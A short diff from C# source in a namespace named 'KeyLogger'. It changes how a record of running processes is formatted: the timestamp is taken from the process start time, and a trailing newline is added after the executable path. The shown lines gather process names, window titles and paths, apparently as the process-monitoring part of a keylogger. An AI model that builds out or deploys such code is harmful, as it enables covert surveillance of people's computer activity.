@@ -94,13 +94,13 @@ namespace key.KeyLogger
 
                         a.NameProcess = p.ProcessName.ToString();
                         a.Title = p.MainWindowTitle.ToString();
-                        a.Time = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
+                        a.Time = p.StartTime.ToString("dd-MM-yyyy hh::mm::ss tt");
                         a.Path = p.MainModule.FileName.ToString();
 
                         string process = "NameProcess: " + a.NameProcess + Environment.NewLine +
                                          "MainWindownTitle: " + a.Title + Environment.NewLine +
                                          "TimeExcute: " + a.Time + Environment.NewLine +
-                                         "Path: " + a.Path;
+                                         "Path: " + a.Path + Environment.NewLine;
 
                         if (ListAndCheck(a) == true)
                         {
